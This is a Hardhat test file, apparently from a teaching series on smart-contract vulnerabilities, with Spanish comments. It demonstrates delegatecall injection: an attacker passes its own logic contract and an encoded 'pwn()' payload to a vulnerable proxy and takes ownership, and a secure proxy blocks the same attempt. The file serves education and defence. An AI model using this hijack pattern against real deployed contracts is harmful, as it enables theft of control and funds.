import { expect } from "chai";
import hre from "hardhat";

describe("09 - Delegatecall Injection", function () {
  let ethers: any;
  let proxyVulnerable: any, attackerLogic: any;
  let proxySecure: any, trustedLogic: any;
  let deployer: any, attacker: any;

  before(async function () {
    const connection = await hre.network.getOrCreate();
    ethers = connection.ethers;
    [deployer, attacker] = await ethers.getSigners();
  });

  beforeEach(async function () {
    // Desplegar Contratos Vulnerables
    const ProxyVulnerable = await ethers.getContractFactory("contracts/09-delegatecall-injection/Vulnerable.sol:ProxyVulnerable");
    proxyVulnerable = await ProxyVulnerable.deploy();

    const AttackerLogic = await ethers.getContractFactory("contracts/09-delegatecall-injection/Vulnerable.sol:AttackerLogic");
    attackerLogic = await AttackerLogic.deploy();

    // Desplegar Contratos Seguros
    const TrustedLogic = await ethers.getContractFactory("contracts/09-delegatecall-injection/Secure.sol:TrustedLogic");
    trustedLogic = await TrustedLogic.deploy();

    const ProxySecure = await ethers.getContractFactory("contracts/09-delegatecall-injection/Secure.sol:ProxySecure");
    proxySecure = await ProxySecure.deploy(await trustedLogic.getAddress());
  });

  describe("Exploit in Vulnerable Contract", function () {
    it("Should allow an attacker to hijack the contract ownership via delegatecall", async function () {
      console.log("    🕵️  Attacker targets the vulnerable executeDelegated function...");
      
      const originalOwner = await proxyVulnerable.owner();
      expect(originalOwner).to.equal(deployer.address);

      // Preparamos los datos de la llamada (el payload malicioso)
      // Queremos que el Proxy ejecute la función 'pwn()' del AttackerLogic
      const abi = ["function pwn()"];
      const iface = new ethers.Interface(abi);
      const maliciousData = iface.encodeFunctionData("pwn");

      // El atacante inyecta su contrato y su payload
      await proxyVulnerable.connect(attacker).executeDelegated(
        await attackerLogic.getAddress(),
        maliciousData
      );

      // Verificamos el secuestro del estado
      const newOwner = await proxyVulnerable.owner();
      expect(newOwner).to.equal(attacker.address);
      
      console.log(`    💀 Proxy Owner was changed from Deployer to Attacker (${newOwner})!`);
    });
  });

  describe("Defense in Secure Contract", function () {
    it("Should prevent execution of untrusted logic contracts", async function () {
      console.log("    🛡️  Attacker attempts to inject malicious logic into the Secure Proxy...");
      
      const originalOwner = await proxySecure.owner();
      expect(originalOwner).to.equal(deployer.address);

      const abi = ["function pwn()"];
      const iface = new ethers.Interface(abi);
      const maliciousData = iface.encodeFunctionData("pwn");

      // El proxy seguro ya no acepta una dirección destino, solo datos.
      // El atacante intenta enviar los datos de su función 'pwn()', pero la 
      // TrustedLogic real no tiene esa función, así que el delegatecall falla en silencio
      // (o revierte si el fallback no está definido).
      try {
        await proxySecure.connect(attacker).executeDelegated(maliciousData);
        expect.fail("Should have failed because TrustedLogic does not have pwn()");
      } catch (error: any) {
        expect(error.message.toLowerCase()).to.include("delegatecall fallo");
      }

      // Verificamos que el Owner permanece a salvo
      const currentOwner = await proxySecure.owner();
      expect(currentOwner).to.equal(deployer.address);
      
      console.log("    ✅ Attack blocked. The Proxy only loaded the trusted, immutable logic.");
    });
  });
});